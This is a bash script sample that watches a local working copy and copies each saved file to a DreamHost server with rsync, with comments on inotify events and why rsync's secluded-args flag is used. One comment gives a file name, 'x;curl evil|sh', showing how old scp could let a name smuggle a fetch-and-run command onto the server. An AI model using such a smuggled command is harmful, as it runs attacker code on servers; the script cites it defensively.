#!/bin/bash
#
# Watch this working copy and copy each SAVED file up to DreamHost.
# Local save -> remote save, like the VS Code SFTP plugin.
#
# THIS IS NOT A DEPLOY SCRIPT. It copies individual files as you save them,
# one at a time, so you can edit locally and refresh the browser. It does not
# sync the tree, does not delete anything, and does not know about git.
#
# Copy this file to sync_files_to_<HOST>.sh, where <HOST> is the ssh Host you
# set as DEST below. Name them the same so a tired glance at the filename tells
# you which server the script points at. Those copies are gitignored.
#
#   cp sync_files_to_dh_sample.sh sync_files_to_bc.sh   # DEST="bc"
#   ./sync_files_to_bc.sh
#
# Run it in a terminal you leave open while you work.
#
# ---------------------------------------------------------------------------
# WHY IT WATCHES WHAT IT WATCHES
#
# close_write alone is not enough. Anything that saves by writing a temp file
# and renaming it into place -- emacs, vim, and Claude Code's Write tool -- never
# fires close_write on the real filename. Claude Code emits exactly this:
#
#     CREATE       ./index.php.tmp.1152241.8da50d32dd09
#     CLOSE_WRITE  ./index.php.tmp.1152241.8da50d32dd09
#     MOVED_TO     ./index.php
#
# So we watch moved_to as well, and skip the temp files. Without moved_to you
# would faithfully copy the temp file to the server and never the real one.
#
# We do NOT watch `modify`: it fires on every write chunk, so one save becomes
# several transfers, and any log file inside the tree feeds itself forever.
#
# We do NOT watch `create`: rsync -R makes the remote directories for us, so
# there is nothing to do when a bare directory appears.
#
# ---------------------------------------------------------------------------
# WHY rsync AND NOT scp
#
#   -R  sends the relative path, creating missing remote directories. Without
#       it, saving into a new directory fails until you mkdir it over ssh.
#
#   -s  hands filenames to rsync's protocol instead of the remote shell. scp
#       before OpenSSH 9.0 lets the REMOTE SHELL parse the destination path, so
#       a file named 'x;curl evil|sh' would execute on the server.
#
# Both ride the ssh ControlMaster from ~/.ssh/config, so a save costs about
# 0.7s. (Plain scp is ~0.5s but does neither of the above.)
#
# The first copy of a new site is not this script's job. Bulk-copy the tree once
# (rsync -a ./ HOST:DEST/ -- WITH .git, never --exclude it: the installed site is
# meant to be a real repo), then start the watcher for the edit loop.
# ---------------------------------------------------------------------------

set -euo pipefail

# An ssh alias from ~/.ssh/config -- keep the username and key there, not here.
# Name this file sync_files_to_${DEST}.sh to match.
DEST="example"

# Project root on the server, with a trailing slash. NOT the web root:
# this must be the directory that contains wwwroot/, classes/, prepend.php.
DEST_PATH="/home/example_user/example.com/"

for tool in inotifywait rsync; do
    command -v "$tool" >/dev/null 2>&1 || {
        echo "$tool not found. On Debian/Ubuntu: sudo apt install inotify-tools rsync" >&2
        exit 1
    }
done

echo "Watching $(pwd)"
echo "  -> ${DEST}:${DEST_PATH}"
echo "Ctrl-C to stop."

inotifywait --quiet --monitor --recursive \
            --event close_write --event moved_to \
            --exclude '(^|/)\.git/' \
            --format '%w%f' \
            . \
| while read -r FULLPATH; do

    REL="${FULLPATH#./}"

    # Editor and tool scratch files. Never copy these.
    case "$REL" in
        *.tmp.*|*~|*.swp|*.swo|.#*) continue ;;
    esac

    # A moved_to can name something that is already gone again.
    [[ -f "$REL" ]] || continue

    echo "copy   $REL"
    rsync --relative --secluded-args --quiet -- "$REL" "${DEST}:${DEST_PATH}" \
        || echo "  FAILED: $REL" >&2
done
